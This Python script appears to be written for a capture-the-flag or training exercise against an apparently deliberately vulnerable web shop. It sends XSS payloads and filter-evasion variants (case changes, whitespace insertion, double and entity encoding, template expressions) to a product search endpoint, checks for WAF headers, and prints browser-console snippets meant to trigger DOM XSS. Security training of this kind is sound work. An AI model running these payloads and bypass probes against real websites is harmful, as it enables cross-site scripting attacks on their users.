#!/usr/bin/env python3
"""
Diagnose why XSS payloads are being blocked
"""

import requests
from urllib.parse import quote
import json

def diagnose_blocking():
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🔍 DIAGNOSING XSS BLOCKING ISSUE")
    print("="*60)
    
    # Test various payloads to understand the filtering
    print("\n1️⃣ Testing what gets blocked vs allowed...")
    
    test_cases = [
        ("plain text", "hello world"),
        ("html tag", "<div>test</div>"),
        ("script word", "script"),
        ("alert word", "alert"),
        ("javascript word", "javascript"),
        ("angle brackets", "<>"),
        ("encoded angles", "%3C%3E"),
        ("img tag", "<img>"),
        ("img with src", "<img src=x>"),
        ("img with onerror", "<img onerror=test>"),
        ("complete XSS", "<img src=x onerror=alert(1)>"),
        ("script tag", "<script>"),
        ("iframe tag", "<iframe>"),
        ("svg tag", "<svg>"),
        ("onload attribute", "onload="),
        ("javascript protocol", "javascript:"),
        ("data protocol", "data:"),
    ]
    
    results = []
    for name, payload in test_cases:
        r = requests.get(f"{base_url}/rest/products/search?q={quote(payload)}")
        status = r.status_code
        results.append((name, payload, status))
        
        symbol = "✅" if status == 200 else "❌"
        print(f"  {symbol} {name}: '{payload[:30]}...' -> {status}")
    
    print("\n2️⃣ Analysis of blocking pattern...")
    
    blocked = [r for r in results if r[2] != 200]
    if blocked:
        print("  Blocked patterns:")
        for name, payload, status in blocked:
            print(f"    - {name}: {status}")
    
    print("\n3️⃣ Testing alternative XSS vectors that might work...")
    
    alternatives = [
        ("HTML entities", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("Unicode escape", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
        ("Case variation", "<ScRiPt>alert(1)</ScRiPt>"),
        ("Tab insertion", "<script\t>alert(1)</script>"),
        ("Newline insertion", "<script\n>alert(1)</script>"),
        ("Double encoding", "%253Cscript%253Ealert(1)%253C/script%253E"),
        ("Hex encoding", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"),
        ("Event handler only", "onerror=alert(1)"),
        ("Expression", "{{7*7}}"),
        ("Template literal", "${alert(1)}"),
    ]
    
    print("\n  Alternative vectors:")
    for name, payload in alternatives:
        r = requests.get(f"{base_url}/rest/products/search?q={quote(payload)}")
        symbol = "✅" if r.status_code == 200 else "❌"
        print(f"    {symbol} {name}: {r.status_code}")
    
    print("\n4️⃣ Checking if it's a WAF or application-level filtering...")
    
    # Check response headers for WAF indicators
    r = requests.get(base_url)
    headers = r.headers
    
    waf_indicators = ['X-WAF', 'X-Security', 'X-Protected-By', 'Server']
    print("\n  Security headers:")
    for header in waf_indicators:
        if header in headers:
            print(f"    {header}: {headers[header]}")
    
    print("\n5️⃣ Testing if DOM XSS works without server validation...")
    
    print("\n  Since the server blocks certain patterns, try these approaches:")
    print("\n  APPROACH 1: Use fragments (not sent to server)")
    print("  In browser console:")
    print("  location.hash = '#<img src=x onerror=alert(1)>'")
    
    print("\n  APPROACH 2: Client-side only manipulation")
    print("  In browser console:")
    print("""  document.querySelector('input[type="search"]').value = '<img src=x onerror=alert(1)>'""")
    print("""  document.querySelector('form').submit()""")
    
    print("\n  APPROACH 3: Direct DOM manipulation")
    print("  In browser console:")
    print("""  var div = document.createElement('div');
  div.innerHTML = '<img src=x onerror=alert(1)>';
  document.body.appendChild(div);""")
    
    print("\n6️⃣ SOLUTION: The server has filtering, but DOM XSS is CLIENT-SIDE...")
    
    print("\n  The challenge is about DOM XSS, not reflected XSS!")
    print("  DOM XSS happens in the browser, not on the server.")
    print("\n  Try this in the browser console:")
    print("\n  " + "="*50)
    print("  // This should work because it's client-side only:")
    print("  var searchBox = document.querySelector('input[type=\"search\"]');")
    print("  if (searchBox) {")
    print("    searchBox.value = '<img src=x onerror=alert(1)>';")
    print("    searchBox.form.submit();")
    print("  } else {")
    print("    // Navigate directly")
    print("    window.location = '#/search?q=' + encodeURIComponent('<img src=x onerror=alert(1)>');")
    print("  }")
    print("  " + "="*50)


if __name__ == "__main__":
    diagnose_blocking()
    
    print("\n" + "="*60)
    print("💡 KEY INSIGHT")
    print("="*60)
    print("\nThe server IS blocking XSS payloads (500 errors),")
    print("but DOM XSS is a CLIENT-SIDE vulnerability.")
    print("\nThe challenge wants you to execute JavaScript in the DOM,")
    print("not necessarily reflect it from the server.")
    print("\nUse the browser console commands above to solve it!")